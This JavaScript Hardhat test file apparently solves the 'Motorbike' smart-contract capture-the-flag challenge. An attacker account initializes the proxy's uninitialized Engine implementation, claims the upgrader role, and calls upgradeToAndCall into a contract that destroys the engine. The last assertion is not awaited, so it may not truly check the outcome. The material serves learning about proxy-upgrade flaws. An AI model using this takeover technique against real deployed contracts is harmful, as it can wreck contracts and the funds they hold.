const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('Motorbike', function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const Engine = await ethers.getContractFactory('Engine', deployer);
    const Motorbike = await ethers.getContractFactory('Motorbike', deployer);
    this.MotorbikeSolution = await ethers.getContractFactory('MotorbikeSolution', attacker);
    this.engine = await Engine.deploy();
    this.motorbike = await Motorbike.deploy(this.engine.address);
    this.motorbikeSolution = await this.MotorbikeSolution.deploy();
  });

  it('Destroys engine', async function () {
    console.log(await ethers.provider.getStorageAt(this.motorbike.address, 0));
    console.log(await this.engine.upgrader());

    await this.engine.connect(attacker).initialize();

    const data = this.MotorbikeSolution.interface.encodeFunctionData('destroy');

    await this.engine.connect(attacker).upgradeToAndCall(this.motorbikeSolution.address, data);

    expect(this.engine.upgrader()).to.be.reverted;
  });
});
